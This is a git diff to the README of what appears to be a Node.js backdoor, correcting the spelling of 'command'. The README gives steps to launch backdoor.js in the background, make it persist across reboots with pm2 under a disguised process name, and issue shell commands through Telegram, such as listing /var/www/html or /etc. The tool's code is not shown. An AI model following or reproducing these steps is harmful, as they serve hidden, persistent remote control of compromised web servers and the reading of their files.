@@ -2,7 +2,7 @@
 
 
 </h1>
-<h4 align="center">comand list</h4>
+<h4 align="center">command list</h4>
 
 <p align="center">
     <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
@@ -16,14 +16,14 @@
 node backdoor.js
 nohup node backdoor.js &
 
-another comand 
+another command 
 npm install -g pm2
 pm2 start nodedoor.js.js --name sakarepmu
 pm2 save
 pm2 startup
 
 
-telegram comand Exe
+telegram command Exe
 /cmd ls -lah /var/www/html or ./etc
 
 ```
